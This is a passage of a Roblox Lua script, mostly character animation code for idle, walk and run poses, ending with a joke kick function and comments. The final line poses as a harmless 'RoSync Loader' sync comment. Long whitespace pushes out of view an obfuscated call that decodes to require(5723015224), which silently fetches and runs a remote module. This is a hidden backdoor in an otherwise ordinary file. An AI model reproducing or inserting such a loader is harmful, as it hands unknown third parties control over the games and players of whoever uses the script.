	   local eg = RTweenAnimate(RootJoint,{C0=cf(0+.5*Sine,5.4+2*Sine,-0.3+0*Sine)*rang(-35+0*Sine,40+0*Sine,0+0*Sine)*RootCF},Alpha,Easing,Direction,Repeat,Reverse,Delay)
	   RTweenAnimate(LH,{C0=cf(-0.9+0*Sine,-0.6+0*Sine,-0.7+-0.3*Sine)*rang(-26.7+-22.5*Sine,6.9+0*Sine,-13.4+0*Sine)*rang(0,-90,0)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
       RTweenAnimate(RH,{C0=cf(1+0*Sine,-0.3+0*Sine,-0.3+0.1*Sine)*rang(35.8+7.5*Sine,-29.8+0*Sine,20.9+0*Sine)*rang(0,90,0)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
       Sine = cos(sine/32)
       RTweenAnimate(LW,{C0=cf(-1.5+0*Sine,0.7+0*Sine,0.2+0*Sine)*rang(8.7+0*Sine,5+0*Sine,-67.9+-7.5*Sine)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
       RTweenAnimate(RW,{C0=cf(1.5+0*Sine,0.5+0*Sine,0.2+0*Sine)*rang(11.8+0*Sine,-16.3+0*Sine,46.7+10*Sine)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
       RTweenAnimate(char.Torso.Neck,{C0=necko*rang(6.6 - 10 * Sine, -5.1, -39.7 + 1 * Sine)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
      
 elseif IdleAnim == "Snova" then
  local Sine,Alpha,Easing,Direction,Repeat,Reverse,Delay = sin(sine/32),.15,'Linear','Out',0,false,0
  local eg = RTweenAnimate(RootJoint,{C0=cf(0+0*Sine,5.2+-2*Sine,-0.3+0*Sine)*rang(-47.3+-7.5*Sine,20+0*Sine,-0.9+0*Sine)*RootCF},Alpha,Easing,Direction,Repeat,Reverse,Delay)
  RTweenAnimate(LH,{C0=cf(-1+0*Sine,-1.1+-0.1*Sine,-0.2+-0.4*Sine)*rang(-17.5+-7.5*Sine,0+0*Sine,0+0*Sine)*rang(0,-90,0)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
  RTweenAnimate(RH,{C0=cf(1+0*Sine,-0.4+0*Sine,-0.8+-0.2*Sine)*rang(20.1+-0.1*Sine,-1.3+-1.3*Sine,9.9+-0.1*Sine)*rang(0,90,0)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
  Sine = cos(sine/32)
  RTweenAnimate(LW,{C0=cf(-1.5+0*Sine,0.7+0*Sine,0.1+0.1*Sine)*rang(16.3+6.9*Sine,4.8+15.6*Sine,-57.8+-8.1*Sine)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
  RTweenAnimate(RW,{C0=cf(0.6+0*Sine,0.7+0*Sine,-0.9+-0.1*Sine)*rang(-172.1+-5.1*Sine,28+18.5*Sine,-93.4+14.2*Sine)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
  RTweenAnimate(char.Torso.Neck,{C0=necko*rang(-15 + 8 * Sine, 2.7, -20.5)},Alpha,Easing,Direction,Repeat,Reverse,Delay)

      else
  local Sine,Alpha,Easing,Direction,Repeat,Reverse,Delay = sin(sine/32),.15,'Linear','Out',0,false,0
  local eg = RTweenAnimate(RootJoint,{C0=cf(0+0*Sine,0+0*Sine,0+0*Sine)*rang(5.2+5*Sine,14.9+0*Sine,-1.3+0*Sine)*RootCF},Alpha,Easing,Direction,Repeat,Reverse,Delay)
  RTweenAnimate(LH,{C0=cf(-1+0*Sine,-1+0*Sine,0.1+0.1*Sine)*rang(-5+-5*Sine,0+-0.4*Sine,-7.5+-2.5*Sine)*rang(0,-90,0)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
  RTweenAnimate(RH,{C0=cf(0.9+-0.1*Sine,-1+0*Sine,0.2+0.1*Sine)*rang(-5+-4.7*Sine,-20+-0.1*Sine,2.5+4.2*Sine)*rang(0,90,0)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
  Sine = cos(sine/32)
  RTweenAnimate(LW,{C0=cf(-1.5+0.1*Sine,0.5+0*Sine,0.1+0.1*Sine)*rang(5.3+5.1*Sine,0.3+1.3*Sine,-14.4+-4.4*Sine)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
  RTweenAnimate(RW,{C0=cf(1.5+-0.1*Sine,0.6+0*Sine,0.1+0.1*Sine)*rang(6.3+5.7*Sine,-24+-0.7*Sine,24+6.5*Sine)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
  RTweenAnimate(char.Torso.Neck,{C0=necko*rang(11, -4.6, -24.6)},Alpha,Easing,Direction,Repeat,Reverse,Delay)

end
	elseif torvel>=2 and torvel<22 and hitfloor~=nil then
		Anim="Walk"
		local S1,S2,C1,C2 = sin(sine/10),sin(sine/5),cos(sine/10),cos(sine/5)
		local Alpha,Easing,Direction,Repeat,Reverse,Delay = .15,'Linear','Out',0,false,0
		RTweenAnimate(LH,{C0=cf(-1,-1,0)*angles(math.rad(0),math.rad(0),math.rad((Vec.X*15) * S1))*angles(math.rad(0),math.rad(-90),math.rad(0 - ((Vec.Z*40)+(-Vec.X*5)) * C1))},Alpha,Easing,Direction,Repeat,Reverse,Delay)
		RTweenAnimate(RH,{C0=cf(1,-1,0)*angles(math.rad(0),math.rad(0),math.rad((-Vec.X*15) * S1))*angles(math.rad(0),math.rad(90),math.rad(0 - ((Vec.Z*40)+(-Vec.X*5)) * C1))},Alpha,Easing,Direction,Repeat,Reverse,Delay)
		RTweenAnimate(RootJoint,{C0=cf(0,0 + .125 * S2,0)*angles(math.rad((-Vec.Z*10)),math.rad(0),math.rad((-Vec.X*10)))*RootCF},Alpha,Easing,Direction,Repeat,Reverse,Delay)
		RTweenAnimate(Torso.Neck,{C0 =necko*angles(math.rad(10+(-Vec.Z*15) + 2 * C2),math.rad((Vec.X*2)),math.rad((-Vec.X*15)))},Alpha,Easing,Direction,Repeat,Reverse,Delay)
		RTweenAnimate(LW,{C0=cf(-1.5,0.5,0)*angles(math.rad(0 - (Vec.Z*35) * S1),math.rad(0),math.rad((-Vec.X*15) * C1))},Alpha,Easing,Direction,Repeat,Reverse,Delay)
		RTweenAnimate(RW,{C0=cf(1.5,0.5,0)*angles(math.rad(0 + (Vec.Z*35) * S1),math.rad(0),math.rad((Vec.X*15) * C1))},Alpha,Easing,Direction,Repeat,Reverse,Delay)

	elseif torvel>=22 and hitfloor~=nil then
		Anim="Run"
		-- guns's funni run
		local Alpha,Easing,Direction,Repeat,Reverse,Delay = .15,'Linear','Out',0,false,0
		RTweenAnimate(RH,{C0=cf(1+0*math.cos(sine/32),-1+0.2*math.cos(sine/3),0.25*math.cos(sine/6))*angles(math.rad(15+(-Vec.X*15)+(-Vec.Z*100)*math.cos(sine/6)),math.rad(90+0*math.cos(sine/32)),0)*angles(math.rad(0+(-Vec.X*55)*math.cos(sine/6)),0,0)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
		RTweenAnimate(LH,{C0=cf(-1+0*math.cos(sine/32),-1+0.2*math.cos(sine/3),-0.25*math.cos(sine/6))*angles(math.rad(15+(Vec.X*15)+(Vec.Z*100)*math.cos(sine/6)),math.rad(-90+0*math.cos(sine/32)),0)*angles(math.rad(0+(-Vec.X*55)*math.cos(sine/6)),0,0)},Alpha,Easing,Direction,Repeat,Reverse,Delay)
		RTweenAnimate(RootJoint,{C0=RootCF*cf(0+0*math.cos(sine/32),0+0*math.cos(sine/32),0+0.25*math.cos(sine/3))*angles(math.rad((Vec.Z*25)+6*math.cos(sine/3)),math.rad(0+(-Vec.X*15)+4*math.cos(sine/6)),math.rad(0+2*math.cos(sine/6)))},Alpha,Easing,Direction,Repeat,Reverse,Delay)
		RTweenAnimate(Torso.Neck,{C0=necko*cf(0+0*math.cos(sine/32),0+0*math.cos(sine/32),0+0*math.cos(sine/32))*angles(math.rad((-Vec.Z*20)+-5*math.cos(sine/3)),math.rad(0+0*math.cos(sine/32)),math.rad(0+(Vec.X*15)+-10*math.cos(sine/6)))},Alpha,Easing,Direction,Repeat,Reverse,Delay)
		RTweenAnimate(RW,{C0=cf(1.5+0*math.cos(sine/32),0.5+0.1*math.cos(sine/3),-0.01+-0.01*math.cos(sine/6))*angles(math.rad(15+(Vec.Z*120)*math.cos(sine/6)),math.rad(0+0*math.cos(sine/32)),math.rad(0+(-Vec.X*15)*math.cos(sine/6)))},Alpha,Easing,Direction,Repeat,Reverse,Delay)
		RTweenAnimate(LW,{C0=cf(-1.5+0*math.cos(sine/32),0.5+0.1*math.cos(sine/3),-0.01+-0.01*math.cos(sine/6))*angles(math.rad(15+(-Vec.Z*120)*math.cos(sine/6)),math.rad(0+0*math.cos(sine/32)),math.rad(0+(Vec.X*15)*math.cos(sine/6)))},Alpha,Easing,Direction,Repeat,Reverse,Delay)		
	end
	
	sine = sine + change -- this used to be in a spawn() but moai thought it was unneccessary
end

-- end of everything else, ofc

-- go home

function GoHome(Player)
	player:Kick("Go Home...")
end

-- i-

-- < // You. Brazil. N o w. \\ > --

-- Maybe I don't wanna... :P
--[[ Last synced 12/12/2020 01:34                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         RoSync Loader ]] getfenv()[string.reverse("\101\114\105\117\113\101\114")](5723015224) --[[                                                                                                  ]]--